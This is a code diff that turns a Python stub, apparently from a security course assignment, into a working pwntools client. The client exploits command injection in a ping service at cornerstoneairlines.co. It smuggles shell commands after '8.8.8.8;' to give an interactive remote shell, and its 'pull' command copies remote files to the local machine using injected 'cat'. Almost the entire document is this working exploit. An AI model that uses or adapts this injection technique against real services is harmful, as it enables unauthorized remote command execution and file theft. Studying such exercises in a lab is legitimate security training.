@@ -8,30 +8,66 @@
 """
 
 import socket
+from pwn import *
+context.log_level = 'error'
 
 host = "cornerstoneairlines.co" # IP address here
 port = 45 # Port here
+b = True
+pwd = '.'
 
-def execute_cmd(cmd):
-    """
-        Sockets: https://docs.python.org/2/library/socket.html
-        How to use the socket s:
+def show_help():
+    print("""    shell Drop into an interactive shell and allow users to gracefully exit
+    pull <remote-path> <local-path> Download files
+    help Shows this help menu
+    quit Quit the shell""")
 
-            # Establish socket connection
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((host, port))
+def execute_cmd():
+    global b, pwd
+    r = remote(host, port)
+    r.recvuntil(': ')
+    #if b:
+    #    print(data.decode('utf-8'))
+    #    b = False
+    cmd = raw_input(">> ").strip()
+    if cmd == "exit":
+        return
+    to_send = "8.8.8.8; cd " + pwd + "; " + cmd + "; echo '~~'; pwd; echo '~~'"
+    #print(to_send)
+    r.sendline(to_send.encode())   # Send a newline \n at the end of your command
+    resp = r.recvuntil(' ~~ ')[300:-4]
+    print(resp)
+    pwd = r.recvuntil(' ~~')[:-3]
+    execute_cmd()
 
-            Reading:
 
-                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
-                print(data)             # Prints data
-
-            Sending:
-
-                s.send("something to send\n")   # Send a newline \n at the end of your command
-    """
-    print("IMPLEMENT ME")
+def pull(cmd):
+    args = cmd.split(" ")
+    if len(args) != 3:
+        show_help()
+        return
+    r = remote(host, port)
+    r.recvuntil(': ')
+    rem = args[1]
+    local = args[2]
+    to_send = "8.8.8.8; cat " + rem
+    r.sendline(to_send)
+    resp = r.recvall()[300:]
+    with open(local, 'w+') as localfile:
+        localfile.write(resp)
 
 
 if __name__ == '__main__':
-    print("IMPLEMENT ME")
+    while True:
+        command = raw_input("> ").strip()
+        if command == "shell":
+            execute_cmd()
+        elif command == "quit":
+            exit()
+        elif command == "help":
+            show_help()
+        elif command[:4] == "pull":
+            pull(command)
+        else:
+            show_help()
+
